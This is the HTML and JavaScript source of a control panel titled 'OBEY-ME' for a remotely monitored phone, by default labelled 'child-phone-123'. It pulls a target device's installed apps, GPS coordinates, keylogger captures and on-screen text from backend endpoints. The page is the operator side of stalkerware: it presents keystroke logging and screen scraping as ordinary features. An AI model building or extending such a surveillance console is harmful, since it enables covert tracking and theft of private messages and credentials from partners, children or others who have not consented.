<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Device Control</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    background:
        radial-gradient(circle at top, #241318 0%, #090708 45%, #050505 100%);
    color: #eee;
    font-family: Arial, sans-serif;
    min-height: 100vh;
}

.header {
    height: 58px;
    border-bottom: 1px solid #32191d;
    display: flex;
    align-items: center;
    padding: 0 15px;
    gap: 10px;
    background: rgba(10, 7, 8, .92);
}

.logo {
    width: 34px;
    height: 34px;
    border-radius: 9px;
    background: #ff3338;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 17px;
}

.title {
    font-size: 15px;
    font-weight: 700;
}

.nav {
    display: flex;
    gap: 8px;
    margin-left: 8px;
}

.nav button {
    background: #171214;
    border: 1px solid #302126;
    color: #aaa;
    padding: 8px 13px;
    border-radius: 9px;
    cursor: pointer;
}

.nav button:hover {
    color: white;
    border-color: #ff3d42;
}

.device-id {
    margin-left: auto;
    font-size: 10px;
    color: #777;
}

.live {
    color: #ff4646;
    border: 1px solid #572226;
    padding: 6px 9px;
    border-radius: 15px;
    font-size: 9px;
}

.container {
    padding: 16px;
    max-width: 1100px;
    margin: auto;
}

.device-card {
    border: 1px solid #3b2529;
    border-radius: 15px;
    padding: 18px;
    background: rgba(22, 15, 17, .82);
    margin-bottom: 14px;
}

.device-name {
    font-size: 17px;
    font-weight: bold;
}

.device-status {
    margin-top: 7px;
    font-size: 11px;
    color: #777;
}

.online-dot {
    color: #35c76a;
}

.controls {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    margin-bottom: 15px;
}

.control-btn {
    background: transparent;
    color: #aaa;
    border: 0;
    padding: 7px 8px;
    font-size: 11px;
    cursor: pointer;
}

.control-btn:hover {
    color: #fff;
}

.control-btn.active {
    background: #ff3439;
    color: white;
    border-radius: 8px;
    box-shadow: 0 0 15px rgba(255, 50, 55, .35);
}

.panel {
    border: 1px solid #3b292d;
    border-radius: 15px;
    background: rgba(22, 15, 17, .86);
    overflow: hidden;
}

.panel-header {
    padding: 15px;
    border-bottom: 1px solid #302125;
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.panel-title {
    font-size: 13px;
    font-weight: bold;
}

.refresh {
    background: #21181a;
    color: #aaa;
    border: 1px solid #392327;
    border-radius: 8px;
    padding: 7px 11px;
    cursor: pointer;
}

.refresh:hover {
    color: white;
    border-color: #ff3c42;
}

.apps {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 9px;
    padding: 14px;
}

.app {
    background: linear-gradient(145deg, #21181b, #161012);
    border: 1px solid #302126;
    border-radius: 9px;
    padding: 13px 11px;
    min-height: 63px;
}

.app-name {
    font-size: 12px;
    font-weight: bold;
}

.package {
    margin-top: 7px;
    color: #666;
    font-size: 9px;
    word-break: break-all;
}

.gps-box {
    display: none;
    padding: 18px;
}

.gps-status {
    background: #181214;
    border: 1px solid #342326;
    border-radius: 10px;
    padding: 17px;
}

.gps-label {
    color: #777;
    font-size: 10px;
}

.gps-value {
    margin-top: 8px;
    font-size: 13px;
    color: #ddd;
}

.demo-note {
    margin-top: 12px;
    color: #666;
    font-size: 10px;
}

.keylog-box, .screen-box {
    background: #181214;
    border: 1px solid #342326;
    border-radius: 10px;
    padding: 17px;
    margin-top: 12px;
}

.keylog-entry {
    padding: 10px;
    border-bottom: 1px solid #2a1d20;
    font-size: 11px;
    color: #ddd;
}

.keylog-time {
    color: #777;
    font-size: 9px;
    margin-left: 8px;
}

.screen-text {
    white-space: pre-wrap;
    font-size: 12px;
    line-height: 1.6;
    color: #ccc;
}

@media(max-width:700px) {
    .apps {
        grid-template-columns: repeat(2, 1fr);
    }

    .device-id {
        display: none;
    }
}

@media(max-width:430px) {
    .apps {
        grid-template-columns: 1fr;
    }

    .nav {
        display: none;
    }
}
</style>
</head>

<body>

<header class="header">

    <div class="logo">⌁</div>

    <div class="title">OBEY-ME</div>

    <div class="nav">
        <button onclick="location.href='/dashboard'">⌂ Home</button>
        <button onclick="location.href='/dashboard'">← Dashboard</button>
    </div>

    <div class="device-id" id="deviceIdDisplay">
        DEVICE ID: <b>child-phone-123</b>
    </div>

    <div class="live">● LIVE LINK</div>

</header>


<main class="container">

    <section class="device-card">

        <div class="device-name" id="deviceName">📱 Loading...</div>

        <div class="device-status">
            <span class="online-dot">●</span>
            <span id="deviceStatusText">Loading...</span>
            &nbsp; • &nbsp; Battery <span id="batteryLevel">—</span>%
        </div>

    </section>


    <!-- CONTROL BUTTONS -->

    <div class="controls">

        <button class="control-btn active"
                onclick="showApps(this)">
            ▦ Installed Apps
        </button>

        <button class="control-btn"
                onclick="showGPS(this)">
            📍 GPS Tracker
        </button>

        <button class="control-btn"
                onclick="showKeylog(this)">
            ⌨ Keylogger
        </button>

        <button class="control-btn"
                onclick="showScreenData(this)">
            🖥 Screen Data
        </button>

    </div>


    <!-- INSTALLED APPS -->

    <section class="panel" id="appsPanel">

        <div class="panel-header">

            <div class="panel-title">
                ▦ Installed Packages & Applications
            </div>

            <button class="refresh" onclick="loadDeviceInfo()">
                ⟳ Fetch Apps
            </button>

        </div>

        <div class="apps" id="installedAppsList">
            Loading apps...
        </div>

    </section>


    <!-- GPS PANEL (Real Data) -->

    <section class="panel gps-box" id="gpsPanel">

        <div class="panel-header">

            <div class="panel-title">
                📍 GPS Tracker
            </div>

            <button class="refresh" onclick="loadDeviceInfo()">
                ⟳ Refresh
            </button>

        </div>

        <div class="gps-status">

            <div class="gps-label">
                LOCATION STATUS
            </div>

            <div class="gps-value" id="gpsValue">
                No location data yet.
            </div>

            <div class="demo-note" id="gpsNote">
                Waiting for device location...
            </div>

        </div>

    </section>


    <!-- KEYLOGGER PANEL -->

    <section class="panel" id="keylogPanel" style="display:none;">

        <div class="panel-header">

            <div class="panel-title">
                ⌨ Keylogger
            </div>

            <button class="refresh" onclick="refreshKeylog()">
                ⟳ Refresh
            </button>

        </div>

        <div class="keylog-box" id="keylogContent">
            Loading keylogs...
        </div>

    </section>


    <!-- SCREEN DATA PANEL -->

    <section class="panel" id="screenPanel" style="display:none;">

        <div class="panel-header">

            <div class="panel-title">
                🖥 Screen Data
            </div>

            <button class="refresh" onclick="refreshScreenData()">
                ⟳ Refresh
            </button>

        </div>

        <div class="screen-box">
            <div class="screen-text" id="screenTextContent">
                Loading screen data...
            </div>
        </div>

    </section>

</main>


<script>

function getDeviceId() {
    const params = new URLSearchParams(window.location.search);
    return params.get("deviceId") || "child-phone-123";
}

function escapeHtml(value) {
    return String(value)
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#039;");
}

function showApps(button) {
    document.querySelectorAll(".control-btn")
        .forEach(btn => btn.classList.remove("active"));
    button.classList.add("active");

    document.getElementById("appsPanel").style.display = "block";
    document.getElementById("gpsPanel").style.display = "none";
    document.getElementById("keylogPanel").style.display = "none";
    document.getElementById("screenPanel").style.display = "none";

    loadDeviceInfo();
}

function showGPS(button) {
    document.querySelectorAll(".control-btn")
        .forEach(btn => btn.classList.remove("active"));
    button.classList.add("active");

    document.getElementById("appsPanel").style.display = "none";
    document.getElementById("gpsPanel").style.display = "block";
    document.getElementById("keylogPanel").style.display = "none";
    document.getElementById("screenPanel").style.display = "none";

    loadDeviceInfo();
}

function showKeylog(button) {
    document.querySelectorAll(".control-btn")
        .forEach(btn => btn.classList.remove("active"));
    button.classList.add("active");

    document.getElementById("appsPanel").style.display = "none";
    document.getElementById("gpsPanel").style.display = "none";
    document.getElementById("keylogPanel").style.display = "block";
    document.getElementById("screenPanel").style.display = "none";

    refreshKeylog();
}

function showScreenData(button) {
    document.querySelectorAll(".control-btn")
        .forEach(btn => btn.classList.remove("active"));
    button.classList.add("active");

    document.getElementById("appsPanel").style.display = "none";
    document.getElementById("gpsPanel").style.display = "none";
    document.getElementById("keylogPanel").style.display = "none";
    document.getElementById("screenPanel").style.display = "block";

    refreshScreenData();
}

// Load device info (including GPS)
async function loadDeviceInfo() {
    const deviceId = getDeviceId();
    document.getElementById("deviceIdDisplay").innerHTML = `DEVICE ID: <b>${escapeHtml(deviceId)}</b>`;

    try {
        const response = await fetch(`/api/device-state?deviceId=${deviceId}`);
        if (!response.ok) throw new Error("Failed to fetch device state");
        const data = await response.json();

        document.getElementById("deviceName").textContent =
            "📱 " + (data.deviceName || "Unknown Device");

        document.getElementById("batteryLevel").textContent =
            data.battery ?? 0;

        if (data.last_seen && Date.now() - data.last_seen < 120000) {
            document.getElementById("deviceStatusText").textContent = "Online";
            document.getElementById("deviceStatusText").className = "online-dot";
        } else {
            document.getElementById("deviceStatusText").textContent = "Offline";
            document.getElementById("deviceStatusText").className = "";
        }

        // Render installed apps
        renderInstalledApps(data.installedApps || []);

        // Update GPS
        if (data.latitude && data.longitude) {
            document.getElementById("gpsValue").innerHTML =
                `Latitude: ${data.latitude.toFixed(6)}<br>Longitude: ${data.longitude.toFixed(6)}`;
            document.getElementById("gpsNote").textContent =
                "Location updated at " + new Date(data.last_seen).toLocaleTimeString();
        } else {
            document.getElementById("gpsValue").textContent = "No location data yet.";
            document.getElementById("gpsNote").textContent = "Waiting for device location...";
        }

    } catch (e) {
        console.error(e);
        document.getElementById("deviceName").textContent = "📱 Error loading device info";
        document.getElementById("batteryLevel").textContent = "—";
        document.getElementById("deviceStatusText").textContent = "Error";
        document.getElementById("installedAppsList").innerHTML = `<div class="app">Failed to load apps</div>`;
        document.getElementById("gpsValue").textContent = "Error loading location.";
        document.getElementById("gpsNote").textContent = "";
    }
}

function renderInstalledApps(apps) {
    const container = document.getElementById("installedAppsList");
    if (apps.length === 0) {
        container.innerHTML = `<div class="app">No apps found</div>`;
        return;
    }
    container.innerHTML = apps.map(app => `
        <div class="app">
            <div class="app-name">${escapeHtml(app.name)}</div>
            <div class="package">${escapeHtml(app.package)}</div>
        </div>
    `).join("");
}

async function refreshKeylog() {
    const deviceId = getDeviceId();
    const container = document.getElementById("keylogContent");
    container.innerHTML = "Loading...";

    try {
        const response = await fetch(`/api/keylog?deviceId=${deviceId}`);
        if (!response.ok) throw new Error("Failed");
        const logs = await response.json();

        if (logs.length === 0) {
            container.innerHTML = "No keylogs yet.";
            return;
        }

        container.innerHTML = logs.map(log => `
            <div class="keylog-entry">
                ${escapeHtml(log.text)}
                <span class="keylog-time">${new Date(log.timestamp).toLocaleTimeString()}</span>
            </div>
        `).join("");
    } catch (e) {
        console.error(e);
        container.innerHTML = "Error loading keylogs.";
    }
}

async function refreshScreenData() {
    const deviceId = getDeviceId();
    const content = document.getElementById("screenTextContent");

    try {
        const response = await fetch(`/api/ui?deviceId=${deviceId}`);
        if (!response.ok) throw new Error("Failed");
        const data = await response.json();

        content.textContent = data.uiText || "No screen data yet.";
    } catch (e) {
        console.error(e);
        content.textContent = "Error loading screen data.";
    }
}

// Initial load
loadDeviceInfo();

// Refresh device info every 30 seconds
setInterval(loadDeviceInfo, 30000);

</script>

</body>
</html>
